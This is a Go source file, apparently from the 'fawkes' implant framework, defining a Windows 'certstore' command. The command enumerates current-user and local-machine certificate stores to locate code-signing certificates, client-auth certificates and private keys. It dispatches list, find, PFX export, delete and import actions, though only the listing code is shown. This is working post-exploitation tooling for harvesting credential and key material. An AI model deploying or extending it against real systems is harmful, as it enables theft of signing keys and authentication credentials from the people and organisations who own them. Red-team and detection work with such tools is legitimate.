//go:build windows
// +build windows

package commands

import (
	"encoding/json"
	"strings"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

type CertstoreCommand struct{}

func (c *CertstoreCommand) Name() string {
	return "certstore"
}

func (c *CertstoreCommand) Description() string {
	return "Enumerate Windows certificate stores to find code signing certs, client auth certs, and private keys"
}

type certstoreParams struct {
	Action   string `json:"action"`
	Store    string `json:"store"`
	Filter   string `json:"filter"`
	Format   string `json:"format"`
	Password string `json:"password"`
	Data     string `json:"data"`
}

var (
	crypt32              = windows.NewLazySystemDLL("crypt32.dll")
	procCertOpenStore    = crypt32.NewProc("CertOpenStore")
	procCertCloseStore   = crypt32.NewProc("CertCloseStore")
	procCertEnumCerts    = crypt32.NewProc("CertEnumCertificatesInStore")
	procCertGetNameW     = crypt32.NewProc("CertGetNameStringW")
	procCryptAcquireCert = crypt32.NewProc("CryptAcquireCertificatePrivateKey")
	procCertDeleteCert   = crypt32.NewProc("CertDeleteCertificateFromStore")
	procCertDupCtx       = crypt32.NewProc("CertDuplicateCertificateContext")
	procCertAddEncoded   = crypt32.NewProc("CertAddEncodedCertificateToStore")
	procPFXExportStore   = crypt32.NewProc("PFXExportCertStoreEx")
	procPFXImportStore   = crypt32.NewProc("PFXImportCertStore")
)

// CERT_STORE_PROV_SYSTEM_W
const (
	certStoreProvSystemW      = 10
	certStoreLocalMachineID   = 0x00020000 // CERT_SYSTEM_STORE_LOCAL_MACHINE
	certStoreCurrentUserID    = 0x00010000 // CERT_SYSTEM_STORE_CURRENT_USER
	certNameSimpleDisplayType = 4
	certNameIssuerFlag        = 1
	cryptAcquireCacheFlag     = 0x00000001
	cryptAcquireSilentFlag    = 0x00000040
)

// Additional constants for export/delete/import
const (
	certStoreAddReplaceExisting = 3     // CERT_STORE_ADD_REPLACE_EXISTING
	x509ASNEncoding             = 1     // X509_ASN_ENCODING
	pkcs7ASNEncoding            = 65536 // PKCS_7_ASN_ENCODING
	certEncodingDefault         = x509ASNEncoding | pkcs7ASNEncoding
	exportableFlag              = 0x00000001 // CRYPT_EXPORTABLE
	reportNotReadyFlag          = 0x00000008 // REPORT_NOT_ABLE_TO_EXPORT_PRIVATE_KEY
)

// CERT_CONTEXT structure
type certContext struct {
	CertEncodingType uint32
	CertEncoded      uintptr
	CertEncodedLen   uint32
	CertInfo         uintptr
	Store            uintptr
}

// CERT_INFO structure (partial — only fields we need)
type certInfo struct {
	Version              uint32
	SerialNumber         cryptIntegerBlob
	SignatureAlgorithm   cryptAlgorithmID
	Issuer               cryptDataBlob
	NotBefore            windows.Filetime
	NotAfter             windows.Filetime
	Subject              cryptDataBlob
	SubjectPublicKeyInfo subjectPublicKeyInfo
}

type cryptIntegerBlob struct {
	Size uint32
	Data uintptr
}

type cryptDataBlob struct {
	Size uint32
	Data uintptr
}

type cryptAlgorithmID struct {
	ObjID      uintptr
	Parameters cryptDataBlob
}

type subjectPublicKeyInfo struct {
	Algorithm cryptAlgorithmID
	PublicKey cryptBitBlob
}

type cryptBitBlob struct {
	Size       uint32
	Data       uintptr
	UnusedBits uint32
}

type certEntry struct {
	Subject      string `json:"subject"`
	Issuer       string `json:"issuer"`
	SerialNumber string `json:"serial_number,omitempty"`
	NotBefore    string `json:"not_before,omitempty"`
	NotAfter     string `json:"not_after,omitempty"`
	Expired      bool   `json:"expired,omitempty"`
	Thumbprint   string `json:"thumbprint"`
	HasPrivKey   bool   `json:"has_private_key"`
	KeyBits      int    `json:"key_bits,omitempty"`
	Store        string `json:"store"`
	Location     string `json:"location"`
}

// CRYPT_DATA_BLOB for PFX operations
type cryptDataBlobPFX struct {
	Size uint32
	Data uintptr
}

func (c *CertstoreCommand) Execute(task structs.Task) structs.CommandResult {
	params, parseErr := unmarshalParams[certstoreParams](task)
	if parseErr != nil {
		return *parseErr
	}

	if params.Action == "" {
		params.Action = "list"
	}

	switch params.Action {
	case "list":
		return certstoreList(params.Store, params.Filter)
	case "find":
		return certstoreFind(params.Store, params.Filter)
	case "export":
		return certstoreExport(params.Store, params.Filter, params.Format, params.Password)
	case "delete":
		return certstoreDelete(params.Store, params.Filter)
	case "import":
		return certstoreImport(params.Store, params.Data, params.Format, params.Password)
	default:
		return errorf("Unknown action: %s (use 'list', 'find', 'export', 'delete', 'import')", params.Action)
	}
}

func certstoreList(store, filter string) structs.CommandResult {
	storesToEnum := getStoreNames(store)
	locations := []struct {
		name string
		flag uint32
	}{
		{"CurrentUser", certStoreCurrentUserID},
		{"LocalMachine", certStoreLocalMachineID},
	}

	var allCerts []certEntry

	for _, loc := range locations {
		for _, storeName := range storesToEnum {
			certs, err := enumCertsInStore(storeName, loc.flag, loc.name, filter)
			if err != nil {
				// Silently skip stores that can't be opened (permission issues)
				continue
			}
			allCerts = append(allCerts, certs...)
		}
	}

	if len(allCerts) == 0 {
		return successResult("[]")
	}

	out, err := json.Marshal(allCerts)
	if err != nil {
		return errorf("JSON marshal error: %v", err)
	}

	return successResult(string(out))
}

func certstoreFind(store, filter string) structs.CommandResult {
	if filter == "" {
		return errorResult("Error: filter is required for find action (search by subject, issuer, or thumbprint)")
	}
	return certstoreList(store, filter)
}

func getStoreNames(store string) []string {
	if store == "" || strings.EqualFold(store, "all") {
		return []string{"MY", "ROOT", "CA", "Trust", "TrustedPeople"}
	}
	return []string{store}
}
